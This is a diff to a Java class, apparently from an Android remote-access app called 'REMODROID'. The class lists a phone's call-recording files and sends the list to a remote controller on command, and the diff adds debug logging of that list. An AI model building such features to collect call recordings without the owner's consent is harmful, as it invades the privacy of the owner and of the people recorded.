@@ -27,9 +27,10 @@ public class CallRecordsList extends Feature {
 
     @Override
     public void AsyncTaskFunc(String Params) {
-        Log.d("REMODROID","Records Location");
+        Log.d("REMODROID","Records Location" + RecordsPath);
         try {
             String toSend = getFiles(RecordsPath);
+            Log.d("REMODROID","toSend" + toSend);
             sendPacket(0,toSend.getBytes("UTF-8"));
         } catch (UnsupportedEncodingException e) {
             Log.d("REMODROID","Records List Ex");
@@ -42,6 +43,7 @@ public class CallRecordsList extends Feature {
         if(Params.split("=")[0].equals("L")){
             try {
                 String toSend = getFiles(RecordsPath);
+                Log.d("REMODROID","toSend" + toSend);
                 sendPacket(0,toSend.getBytes("UTF-8"));
             } catch (UnsupportedEncodingException e) {
                 Log.d("REMODROID","Records List Ex");
